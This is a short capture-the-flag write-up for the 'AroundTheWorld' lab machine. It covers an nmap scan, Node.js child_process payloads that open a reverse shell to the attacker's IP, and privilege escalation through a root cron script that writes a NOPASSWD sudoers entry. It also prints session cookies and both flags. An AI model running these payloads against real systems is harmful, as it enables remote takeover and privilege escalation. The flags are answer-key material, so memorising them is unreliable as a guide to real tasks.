# AroundTheWorld

## Enumeration

```bash
└─$ nmap -sV -A -p- -sC -T4 10.10.3.188                          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 11:25 BST
Nmap scan report for 10.10.3.188
Host is up (0.034s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 51:91:53:a5:af:1a:5a:78:67:62:ae:d6:37:a0:8e:33 (RSA)
|   256 c1:70:72:cc:82:c3:f3:3e:5e:0a:6a:05:4e:f0:4c:3c (ECDSA)
|_  256 a2:ea:53:7c:e1:d7:60:bc:d3:92:08:a9:9d:20:6b:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Around The World
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.37 seconds
```
## Exploitation

### Sessions cookie with Burp Suite for the exploit

```bash
marius = connect.sid=s%3AYEh3XOXfeJ4VmlYmq7JRYp6waS-y555e.Ts929QOfsFRtzp%2FT3bT9nOizyk1LRI5oYZTlTe8vRZs

clement = connect.sid=s%3A40X2GhAa_PU5sozzpjJJkN4O2xcwURpc.FW0yOOX%2BMZeltzwEL8HXypG167cJU1A9FMVop3uE6TM

yes 1 | head -n 10000 > gold.txt

./script.py

require("child_process").exec("bash -c 'exec bash -i &>/dev/tcp/10.8.37.214/4447 <&1'")
require("child_process").exec("bash -c 'exec bash -i &>/dev/tcp/10.8.37.214/4444 <&1'")
```
### Got a reverse shell as simple user

#### Spawn an upgrade shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## User FLAG

```cat user.txt``` = EPI{we_R_HuM4N2_4f7eR_4ll}

## Privilege Escalation

### Got a shell as tb3 who has more rights
```bash
sudo -u tb3 /bin/bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

./pspy64 :

2024/05/28 12:05:55 CMD: UID=0     PID=2      | 
2024/05/28 12:05:55 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2024/05/28 12:06:01 CMD: UID=0     PID=1685   | /bin/sh /home/tb3/admin/clean_logs.sh 
2024/05/28 12:06:01 CMD: UID=0     PID=1684   | rm /home/gm08/admin/log.jukebox 
2024/05/28 12:06:01 CMD: UID=0     PID=1683   | /bin/sh /home/tb3/admin/clean_logs.sh 
2024/05/28 12:06:01 CMD: UID=0     PID=1682   | /bin/sh /home/gm08/admin/clean_logs.sh 
2024/05/28 12:06:01 CMD: UID=0     PID=1681   | /bin/sh -c /home/tb3/admin/clean_logs.sh 
2024/05/28 12:06:01 CMD: UID=0     PID=1680   | /bin/sh -c /home/gm08/admin/clean_logs.sh 
2024/05/28 12:06:01 CMD: UID=0     PID=1679   | /usr/sbin/CRON -f 
2024/05/28 12:06:01 CMD: UID=0     PID=1678   | /usr/sbin/CRON -f

tb3@aroundtheworld:~/admin$ cat clean_logs.sh 
rm /home/gm08/admin/log.jukebox

./jukebox clean_logs.sh

eecchhoo  ""ttbb33  AALLLL==((AALLLL::AALLLL))  NNOOPPAASSSSWWDD  //bbiinn//bbaasshh""  >> //eettcc//ssuuddooeerrss

sudo chown luffy:luffy /root
ssuuddoo  cchhoowwnn  ttbb33::ttbb33  //rroooott

ccaatt  //rroooott//rroooott..ttxxtt  >>  //hhoommee//ttbb33//rroooott..ttxxtt
```

## Root FLAG

```cat root.txt``` = EPI{172_4m421n9_WH@_JOoll_ph1ND_ph4c3_7o_Ph4c3}
